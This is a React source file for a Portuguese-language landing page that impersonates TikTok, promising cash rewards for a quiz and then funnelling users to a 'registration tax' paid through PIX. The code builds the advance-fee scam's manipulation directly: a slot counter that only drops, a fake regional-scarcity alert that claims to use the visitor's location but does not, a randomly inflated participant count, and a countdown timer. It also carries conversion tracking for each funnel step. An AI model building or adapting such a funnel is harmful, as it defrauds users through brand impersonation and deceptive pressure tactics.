import { CheckoutView } from '@/components/CheckoutView';
import { Toaster } from 'sonner';
import { ProcessingView } from '@/components/ProcessingView';
import { QuizView } from '@/components/QuizView';
import { RegistrationView } from '@/components/RegistrationView';
import { VideoView } from '@/components/VideoView';
import { WithdrawView } from '@/components/WithdrawView';
import TikTokLogo from '@/../components/TikTokLogo';
import { Head } from '@inertiajs/react';
import { AnimatePresence, motion, Variants } from 'framer-motion';
import {
    BadgeCheck,
    Calendar,
    ChevronRight,
    DollarSign,
    Flame,
    Gift,
    MapPin,
    ShieldCheck,
    Trophy,
    TriangleAlert,
    Users,
} from 'lucide-react';
import { useEffect, useState } from 'react';

const contentVariants: Variants = {
    hidden: { opacity: 0, y: 20 },
    visible: (i: number) => ({
        opacity: 1,
        y: 0,
        transition: { delay: i * 0.1, duration: 0.4 },
    }),
};

const SlotsRemaining = () => {
    const [slots, setSlots] = useState(23);
    const total = 100;
    useEffect(() => {
        const interval = setInterval(() => {
            setSlots((prev) => Math.max(3, prev - (Math.random() < 0.7 ? 1 : 0)));
        }, 10000);
        return () => clearInterval(interval);
    }, []);
    const percentageFilled = ((total - slots) / total) * 100;
    return (
        <motion.div custom={3.5} variants={contentVariants} initial="hidden" animate="visible" className="mb-3 w-full rounded-2xl border border-destructive/20 bg-destructive/5 p-3.5">
            <div className="mb-2 flex items-center gap-2">
                <Users className="h-4 w-4 text-destructive" />
                <span className="text-xs font-bold text-destructive">Restam apenas <span className="text-sm">{slots}</span> vagas para hoje!</span>
            </div>
            <div className="h-2 w-full overflow-hidden rounded-full bg-muted">
                <div className="h-full rounded-full bg-gradient-to-r from-destructive to-destructive/70 transition-all duration-1000" style={{ width: `${percentageFilled}%` }} />
            </div>
        </motion.div>
    );
};

const RegionalNotification = () => {
    const [visible, setVisible] = useState(false);
    const [count, setCount] = useState(3);
    useEffect(() => {
        const timer = setTimeout(() => setVisible(true), 5000);
        const interval = setInterval(() => {
            setCount((prev) => Math.max(1, prev - (Math.random() < 0.5 ? 1 : 0)));
            setVisible(true);
        }, 35000);
        return () => { clearTimeout(timer); clearInterval(interval); };
    }, []);
    return (
        <AnimatePresence>
            {visible && (
                <motion.div initial={{ opacity: 0, x: 60 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 60 }} className="fixed right-4 bottom-6 z-50 flex max-w-[280px] items-start gap-3 rounded-2xl border border-border bg-card p-3.5 shadow-2xl">
                    <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-xl bg-primary/10"><MapPin className="h-4 w-4 text-primary" /></div>
                    <div>
                        <p className="text-xs font-bold leading-tight text-foreground">Apenas {count} {count === 1 ? 'pessoa' : 'pessoas'} da sua região ainda podem participar</p>
                        <p className="mt-0.5 text-[10px] text-muted-foreground">Baseado na sua localização</p>
                    </div>
                </motion.div>
            )}
        </AnimatePresence>
    );
};

export default function Welcome({ 
    registrationTaxValue = '20.19'
}: { 
    registrationTaxValue?: string,
}) {
    const [participants, setParticipants] = useState(2847);
    const [step, setStep] = useState<'landing' | 'quiz' | 'withdraw' | 'registration' | 'video' | 'processing' | 'checkout'>('landing');
    const [finalBalance, setFinalBalance] = useState(0);
    const [timerEnd] = useState(() => Date.now() + 1000 * 60 * 7 + 32000);

    useEffect(() => {
        const interval = setInterval(() => {
            setParticipants((prev) => Math.max(2400, Math.min(3200, prev + (Math.random() < 0.6 ? 2 : -1))));
        }, 3000);
        return () => clearInterval(interval);
    }, []);

    useEffect(() => {
        if (typeof window !== 'undefined' && (window as any).ttq) {
            const ttq = (window as any).ttq;
            switch (step) {
                case 'landing':
                    ttq.track('ViewContent', { content_name: 'Landing Page' });
                    break;
                case 'quiz':
                    ttq.track('ViewContent', { content_name: 'Quiz' });
                    break;
                case 'withdraw':
                    ttq.track('InitiateCheckout', { content_name: 'Withdraw Request' });
                    break;
                case 'registration':
                    ttq.track('AddPaymentInfo', { content_name: 'Registration Tax' });
                    break;
                case 'video':
                    ttq.track('ViewContent', { content_name: 'VSL Video' });
                    break;
                case 'processing':
                    ttq.track('Search', { content_name: 'Processing Payment' });
                    break;
                case 'checkout':
                    ttq.track('CompleteRegistration', { content_name: 'PIX Checkout' });
                    break;
            }
        }
    }, [step]);

    return (
        <>
            <Head title="Programa de Recompensas TikTok" />
            <AnimatePresence mode="wait">
                {step === 'landing' && (
                    <motion.div key="landing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, x: -20 }} className="flex min-h-screen items-center justify-center bg-[#eff6ff] p-0 sm:p-5">
                        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="w-full max-w-[520px] overflow-hidden border border-border/40 bg-card shadow-2xl sm:rounded-3xl">
                            <div className="bg-[#ff0050] p-3 text-center text-xs font-bold uppercase tracking-wide text-white">🎁 Programa de Recompensas TikTok 2026</div>
                            <div className="flex flex-col items-center p-6">
                                <motion.div custom={0} variants={contentVariants} initial="hidden" animate="visible"><TikTokLogo /></motion.div>
                                <motion.h1 custom={1} variants={contentVariants} initial="hidden" animate="visible" className="mt-4 mb-1 text-center text-2xl font-black leading-tight sm:text-3xl">Ganhe <span className="text-[#ff0050]">dinheiro</span> respondendo perguntas!</motion.h1>
                                <motion.p custom={2} variants={contentVariants} initial="hidden" animate="visible" className="mb-2 text-center text-sm text-muted-foreground">O TikTok está premiando usuários selecionados com recompensas em dinheiro por participar de uma pesquisa rápida.</motion.p>
                                <SlotsRemaining />
                                <div className="mb-4 grid w-full gap-2.5">
                                    {[
                                        { icon: Gift, title: 'Recompensas Instantâneas', desc: 'Ganhe a cada pergunta' },
                                        { icon: DollarSign, title: 'Saque Rápido via PIX', desc: 'Receba direto no seu banco' },
                                    ].map((item, index) => (
                                        <motion.div key={index} custom={index + 3} variants={contentVariants} initial="hidden" animate="visible" className="flex items-center gap-4 rounded-2xl border border-border/40 bg-accent/20 p-4">
                                            <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-[#ff0050]/10"><item.icon className="h-5 w-5 text-[#ff0050]" /></div>
                                            <div><div className="text-sm font-bold">{item.title}</div><div className="text-[11px] text-muted-foreground">{item.desc}</div></div>
                                        </motion.div>
                                    ))}
                                    <motion.button custom={6} variants={contentVariants} initial="hidden" animate="visible" whileTap={{ scale: 0.97 }} onClick={() => setStep('quiz')} className="flex w-full items-center justify-center gap-2.5 rounded-2xl bg-[#ff0050] py-4 text-base font-bold text-white shadow-xl shadow-[#ff0050]/20">PARTICIPAR AGORA <ChevronRight className="h-5 w-5" /></motion.button>
                                </div>
                            </div>
                            <RegionalNotification />
                        </motion.div>
                    </motion.div>
                )}

                {step === 'quiz' && (
                    <motion.div key="quiz" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                        <QuizView onComplete={(b) => { setFinalBalance(b); setStep('withdraw'); }} />
                    </motion.div>
                )}

                {step === 'withdraw' && (
                    <motion.div key="withdraw" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                        <WithdrawView onBack={() => setStep('landing')} onSubmit={() => setStep('registration')} lastReward={finalBalance / 10} timerEnd={timerEnd} />
                    </motion.div>
                )}

                {step === 'registration' && (
                    <motion.div key="registration" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                        <RegistrationView onSubmit={() => setStep('video')} taxValue={registrationTaxValue} />
                    </motion.div>
                )}

                {step === 'video' && (
                    <motion.div key="video" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                        <VideoView timerEnd={timerEnd} finalBalance={finalBalance} onComplete={() => setStep('processing')} />
                    </motion.div>
                )}

                {step === 'processing' && (
                    <motion.div key="processing" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                        <ProcessingView finalBalance={finalBalance} onComplete={() => setStep('checkout')} />
                    </motion.div>
                )}

                {step === 'checkout' && (
                    <motion.div key="checkout" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.3 }}>
                        <CheckoutView taxValue={registrationTaxValue} />
                    </motion.div>
                )}
            </AnimatePresence>
            <Toaster position="top-center" richColors />
        </>
    );
}
